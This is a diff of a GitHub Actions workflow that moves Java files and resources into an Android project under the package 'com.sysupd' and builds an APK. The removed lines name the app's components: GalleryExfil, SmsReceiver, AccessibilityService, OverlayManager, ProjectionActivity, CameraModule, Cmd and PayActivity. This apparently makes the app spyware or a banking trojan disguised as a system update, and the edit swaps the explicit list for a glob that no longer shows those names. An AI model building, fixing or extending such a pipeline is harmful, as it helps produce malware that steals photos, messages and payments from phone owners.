@@ -23,23 +23,31 @@ jobs:
           wget -q https://services.gradle.org/distributions/gradle-8.7-bin.zip
           unzip -q gradle-8.7-bin.zip
           echo "/tmp/gradle-8.7/bin" >> $GITHUB_PATH
-          /tmp/gradle-8.7/bin/gradle --version
 
-      - name: Rearrange files
+      - name: Clean and Rearrange
         run: |
           set -e
+          echo "=== BEFORE ==="
+          find . -name "*.java" -o -name "*.xml" -o -name "*.gradle" | grep -v '.git/' | sort
+
+          # Backup any existing app folder
+          if [ -d app/src/main/java/com/sysupd ]; then
+            echo "app folder exists, cleaning old files"
+            rm -rf app/src/main/java/com/sysupd/*.java
+          fi
+
           mkdir -p app/src/main/java/com/sysupd
           mkdir -p app/src/main/res/layout
           mkdir -p app/src/main/res/values
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/mipmap-hdpi
 
-          for f in AccessibilityService BootReceiver CameraModule Cmd Core \
-                   ForegroundService GalleryExfil MainActivity NotificationListener \
-                   OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
-            if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
+          # Move every root .java file into app/src/main/java/com/sysupd/
+          for f in *.java; do
+            if [ -f "$f" ]; then mv "$f" app/src/main/java/com/sysupd/; fi
           done
 
+          # Move root XML resources
           [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
           [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
           [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
@@ -49,8 +57,15 @@ jobs:
           [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
           [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
           [ -f google-services.json ] && mv google-services.json app/
-          rm -f build.gradle
 
+          # Remove any duplicate
+          find . -name "AccessibilityService.java" | head -n 1 | xargs -I{} sh -c '
+            first_file="$1"
+            find . -name "AccessibilityService.java" -not -path "$first_file" -delete
+          ' sh {}
+
+          # Root build.gradle new
+          rm -f build.gradle
           cat > build.gradle << 'EOF'
           buildscript {
               repositories { google(); mavenCentral() }
@@ -64,6 +79,7 @@ jobs:
           }
           EOF
 
+          # app/build.gradle
           cat > app/build.gradle << 'EOF'
           plugins {
               id 'com.android.application'
@@ -102,6 +118,9 @@ jobs:
           EOF
 
           echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+
+          echo "=== AFTER ==="
+          find app -type f | sort
 
       - name: Build APK
         run: gradle assembleDebug --no-daemon --stacktrace
